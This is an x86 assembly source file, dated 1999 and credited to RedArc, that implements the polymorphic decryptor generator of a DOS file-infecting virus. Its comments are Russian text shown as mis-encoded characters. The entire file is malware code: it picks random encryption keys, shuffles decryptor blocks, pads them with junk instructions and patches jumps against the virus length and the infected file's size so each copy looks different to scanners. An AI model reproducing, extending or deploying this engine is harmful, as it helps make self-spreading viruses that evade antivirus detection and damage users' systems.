   ;Š «ìªã«ïæ¨ï ¯®«¨¤¥ªà¨¯â®à  (c) 1999 by RedArc

   ;---
   IndexBuff equ 76*2            ;‘¬¥é¥¨¥ ¨¤¥ªá®£® ¡ãä¥à 
   BlockOffset equ TabelleFlags  ;‘¬¥é¥¨¥ ¡ãä¥à  ä« £®¢
   ;---

   CalcPoly:
             push ax bx cx dx si
   ;Ž¡ã«¥¨¥ ä« £®¢
             lea si,[bp+TabelleFlags]
             mov cx,11
             xor ax,ax
   CP1:
             mov word ptr ds:[si],ax
             add si,2
             loop CP1
   ;Š «ìªã«ïæ¨ï ®¢ëå ª«îç¥© è¨äà®¢ª¨
             call _Calc_Rnd16
             mov word ptr ds:[bp+TabelleKeys],bx
             call _Calc_Rnd16
             mov word ptr ds:[bp+TabelleKeys+2],bx
             call _Calc_Rnd16
             mov word ptr ds:[bp+TabelleKeys+4],bx
   ;‚ë¡®à á«ãç ©®£® ¡«®ª , ¥£® ª «ìªã«ïæ¨ï, ¢ëáâ ¢«¥¨¥ ä« £  ¨ § ¯®¬¨ ¨¥ ª®áâ â
             mov cx,14
   @CPa:
             push cx
             lea ax,[bp+@CP2]
             push ax
   @CP0:
             mov ah,14
             call RND_Tabelle
             cmp ah,14
             je @CP0
             mov al,ah
             call Get_Flag
             cmp al,0
             jne @CP0
             xchg ah,al
             call Put_Flag
             shl ax,1
             lea si,[bp+TabellePoly]
             add si,ax
             mov ax,word ptr ds:[si]
             add ax,bp
             push ax
             ret
   @CP2 equ $-EntryPoint
   CP2:
             pop cx
             dec cx
             cmp cx,1
             je CP3
             jmp @CPa
   CP3:
             lea si,[bp+TabelleFlags]
             mov cx,0
   CP4:
             lodsb
             cmp al,0
             je CP5
             inc cx
             jmp short CP4
   CP5:
             lea ax,[bp+@CP6]
             push ax
             xchg cx,ax
             shl ax,1
             lea si,[bp+TabellePoly]
             add si,ax
             mov ax,word ptr ds:[si]
             add ax,bp
             push ax
             ret
   @CP6 equ $-EntryPoint
   CP6:
   ; Š «ìªã«ïæ¨ï  ¤à¥á®¢ ¯¥à¥å®¤®¢
             lea bx,[bp+Buffer]
             push di
   ;---
             mov si,word ptr ds:[bp-IndexBuff+4]
             mov di,word ptr ds:[bp-IndexBuff+2]
             call CalcJump
   ;---
             mov si,word ptr ds:[bp-IndexBuff+10]
             mov di,word ptr ds:[bp-IndexBuff+8]
             call CalcJump
   ;---
             mov si,word ptr ds:[bp-IndexBuff+16]
             mov di,word ptr ds:[bp-IndexBuff+14]
             call CalcJump
   ;---
             mov si,word ptr ds:[bp-IndexBuff+22]
             mov di,word ptr ds:[bp-IndexBuff+20]
             call CalcJump
   ;---
             mov si,word ptr ds:[bp-IndexBuff+28]
             mov di,word ptr ds:[bp-IndexBuff+26]
             call CalcJump
   ;---
             mov si,word ptr ds:[bp-IndexBuff+34]
             mov di,word ptr ds:[bp-IndexBuff+32]
             call CalcJump
   ;---
             mov si,word ptr ds:[bp-IndexBuff+40]
             mov di,word ptr ds:[bp-IndexBuff+38]
             call CalcJump
   ;---
             mov si,word ptr ds:[bp-IndexBuff+44]
             mov di,word ptr ds:[bp-IndexBuff+42]
             call CalcJump
   ;---
             mov si,word ptr ds:[bp-IndexBuff+48]
             mov di,word ptr ds:[bp-IndexBuff+46]
             call CalcJump
   ;---
             mov si,word ptr ds:[bp-IndexBuff+52]
             mov di,word ptr ds:[bp-IndexBuff+50]
             call CalcJump
   ;---
             mov si,word ptr ds:[bp-IndexBuff+52]
             mov di,word ptr ds:[bp-IndexBuff+50]
             call CalcJump
   ;---
             mov si,word ptr ds:[bp-IndexBuff+56]
             mov di,word ptr ds:[bp-IndexBuff+54]
             call CalcJump
   ;---
             mov si,word ptr ds:[bp-IndexBuff+60]
             mov di,word ptr ds:[bp-IndexBuff+58]
             call CalcJump
   ;---
             mov si,word ptr ds:[bp-IndexBuff+44]
             mov di,word ptr ds:[bp-IndexBuff+68]
             call CalcJump
   ;---
             mov si,word ptr ds:[bp-IndexBuff+74]
             mov di,word ptr ds:[bp-IndexBuff+72]
             call CalcJump
   ;Š «ìªã«ïæ¨ï ¯à®ç¨å  ¤à¥á®¢
             pop di
             push bx
             mov ax,di
             sub ax,bx
             mov cx,word ptr ds:[bp+DTA_NEW+1ah]
             add ax,cx
             inc ah  ;‚ à¥£¨áâà¥ AX ®¢ë©  ¤à¥á EntryPoint
             mov si,word ptr ds:[bp-IndexBuff+6]
             mov word ptr ds:[si],ax
   ;---
             mov si,word ptr ds:[bp-IndexBuff+30]
             mov word ptr ds:[si+1],ax
   ;---
             pop bx
             mov ax,word ptr ds:[bp-IndexBuff+28]
             sub ax,bx
             add ax,cx
             inc ah ;‚ à¥£¨áâà¥ AX  ¤à¥á ¬¥âª¨ L1
             mov si,word ptr ds:[bp-IndexBuff+12]
             mov word ptr ds:[si],ax
   ;---
             mov si,word ptr ds:[bp-IndexBuff+18]
             mov word ptr ds:[si],ax
   ;---
             mov ax,word ptr ds:[bp+TabelleKeys]
             mov si,word ptr ds:[bp-IndexBuff+24]
             mov word ptr ds:[si+1],ax ;StartKey
   ;---
             mov ax,word ptr ds:[bp+TabelleKeys+2]
             mov si,word ptr ds:[bp-IndexBuff+64]
             mov word ptr ds:[si],ax ;LoopKey
   ;---
             mov ax,word ptr ds:[bp+TabelleKeys+4]
             mov si,word ptr ds:[bp-IndexBuff+76]
             mov word ptr ds:[si],ax ;EndKey
   ;---
   ;‚ëå®¤
             pop si dx cx bx ax
             ret
   ;---
   TabellePoly equ $-EntryPoint
     dw PB1, PB2, PB3,  PB4,  PB5,  PB6,  PB7
     dw PB8, PB9, PB10, PB11, PB12, PB13, PB14
   TabelleFlags equ $-EntryPoint
     db 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
   TabelleKeys equ $-EntryPoint
   ;    StartKey LoopKey EndKey StatKey Reserved
     dw 0,       0,      0,     0,      0
   ;---
   PB1 equ $-EntryPoint
   PBlock1: ;‘®åà ¥¨¥ à¥£¨áâà®¢ ¨ â®çª¨ ¢®§¢à â 
          mov word ptr ds:[bp-IndexBuff],di
          call Musor
          mov al,068h
          stosb
          mov ax,word ptr ds:[bp+JMP_OFS] ;‘¬¥é¥¨¥ ª®¬ ¤ë ¯¥à¥å®¤ 
          stosw
          call Musor
          mov al,09ch
          stosb
          call Musor
          mov al,060h
          stosb
          call Musor
          mov al,01eh
          stosb
          call Musor
          mov al,06h
          stosb
          call Musor
          mov al,0eh
          stosb
          call Musor
          mov al,0eh
          stosb
          call Musor
          mov al,01fh
          stosb
          call Musor
          mov al,007h
          stosb
          call Musor
          mov word ptr ds:[bp-IndexBuff+2],di
          call Jump
          call Musor
          ret
   ;---
   PB2 equ $-EntryPoint ;push offset EntryPoint / jmp @a
   PBlock2:
          mov word ptr ds:[bp-IndexBuff+4],di
          call Musor
          mov al,068h
          stosb
          mov word ptr ds:[bp-IndexBuff+6],di
          mov ax,1234h ;€¤à¥á ¯¥à¥å®¤  ¯®á«¥ ¤¥è¨äà®¢ª¨
          stosw
          call Musor
          mov word ptr ds:[bp-IndexBuff+8],di
          call Jump
          call Musor
          ret
   ;---
   PB3 equ $-EntryPoint ;push offset L1 / jmp @b
   PBlock3:
          mov word ptr ds:[bp-IndexBuff+10],di
          call Musor
          mov al,068h
          stosb
          mov word ptr ds:[bp-IndexBuff+12],di
          mov ax,1234h ;€¤à¥á  ç «  æ¨ª« 
          stosw
          call Musor
          mov word ptr ds:[bp-IndexBuff+14],di
          call Jump
          call Musor
          ret
   ;---
   PB4 equ $-EntryPoint ;push offset L1 / jmp @c
   PBlock4:
          mov word ptr ds:[bp-IndexBuff+16],di
          call Musor
          mov al,068h
          stosb
          mov word ptr ds:[bp-IndexBuff+18],di
          mov ax,1234h ;€¤à¥á  ç «  æ¨ª« 
          stosw
          call Musor
          mov word ptr ds:[bp-IndexBuff+20],di
          call Jump
          call Musor
          ret
   ;---
   PB5 equ $-EntryPoint ;mov bx,1234h / jmp L1
   PBlock5:
          mov word ptr ds:[bp-IndexBuff+22],di
          call Musor
          mov word ptr ds:[bp-IndexBuff+24],di
          mov bl,3
          mov ax,1234h
          call Mov_Reg16_Value16_Tabelle
          call _al_bx
          call Musor
          mov word ptr ds:[bp-IndexBuff+26],di
          call Jump
          call Musor
          ret
   ;---
   PB6 equ $-EntryPoint ;mov si,offset EntryPoint / jmp @d
   PBlock6:
          mov word ptr ds:[bp-IndexBuff+28],di
          call Musor
          mov word ptr ds:[bp-IndexBuff+30],di
          mov bl,6
          mov ax,1234h
          call Mov_Reg16_Value16_Tabelle
          call _al_bx
          call Musor
          mov word ptr ds:[bp-IndexBuff+32],di
          call Jump
          call Musor
          ret
   ;---
   PB7 equ $-EntryPoint ;mov cx,VirLength/2 / jmp @e
   PBlock7:
          mov word ptr ds:[bp-IndexBuff+34],di
          call Musor
          mov word ptr ds:[bp-IndexBuff+36],di
          mov ax,Virlength / 2
          mov bl,1
          call Mov_Reg16_Value16_Tabelle
          call _al_bx
          call Musor
          mov word ptr ds:[bp-IndexBuff+38],di
          call Jump
          call Musor
          ret
   ;---
   PB8 equ $-EntryPoint ;mov di,si / jmp L2
   PBlock8:
          mov word ptr ds:[bp-IndexBuff+40],di
          call Musor
          mov bl,7
          mov bh,6
          call Mov_Reg1_Reg2_16_Tabelle
          xchg bx,ax
          stosw
          call Musor
          mov word ptr ds:[bp-IndexBuff+42],di
          call Jump
          call Musor
          ret
   ;---
   PB9 equ $-EntryPoint ;lodsw / jmp @f
   PBlock9:
          mov word ptr ds:[bp-IndexBuff+44],di
          call Musor
          mov al,0adh
          stosb
          call Musor
          mov word ptr ds:[bp-IndexBuff+46],di
          call Jump
          call Musor
          ret
   ;---
   PB10 equ $-EntryPoint ;xor ax,bx / jmp @g
   PBlock10:
          mov word ptr ds:[bp-IndexBuff+48],di
          call Musor
          mov bl,0
          mov bh,3
          call Xor_Reg1_Reg2_16_Tabelle
          xchg bx,ax
          stosw
          call Musor
          mov word ptr ds:[bp-IndexBuff+50],di
          call Jump
          call Musor
          ret
   ;---
   PB11 equ $-EntryPoint ;stosw / jmp @h
   PBlock11:
          mov word ptr ds:[bp-IndexBuff+52],di
          call Musor
          mov al,0ABh
          stosb
          call Musor
          mov word ptr ds:[bp-IndexBuff+54],di
          call Jump
          call Musor
          ret
   ;---
   PB12 equ $-EntryPoint ;dec cx / jmp @i
   PBlock12:
          mov word ptr ds:[bp-IndexBuff+56],di
          call Musor
          mov al,049h
          stosb
          call Musor
          mov word ptr ds:[bp-IndexBuff+58],di
          call Jump
          call Musor
          ret
   ;---
   PB13 equ $-EntryPoint ;cmp cx,0 / je @i1 / xor bx,1234h / jmp 200h / jmp 300h
   PBlock13:
          mov word ptr ds:[bp-IndexBuff+60],di
          call Musor
          mov ax,0f983h
          stosw
          mov al,0
          stosb
          mov ax,00A74h
          stosw
          call Musor1
          mov ax,0f381h
          stosw
          mov word ptr ds:[bp-IndexBuff+64],di
          mov ax,1234h
          stosw
          call Musor1
          mov word ptr ds:[bp-IndexBuff+68],di
          call Jump
          call Musor1
          mov word ptr ds:[bp-IndexBuff+72],di
          call Jump
          call Musor
          ret
   ;---
   PB14 equ $-EntryPoint ;xor bx,4321h / ret
   PBlock14:
          mov word ptr ds:[bp-IndexBuff+74],di
          call Musor
          mov ax,0f381h
          stosw
          mov word ptr ds:[bp-IndexBuff+76],di
          mov ax,1234h
          stosw
          call Musor
          mov al,0c3h
          stosb
          call Musor
          ret
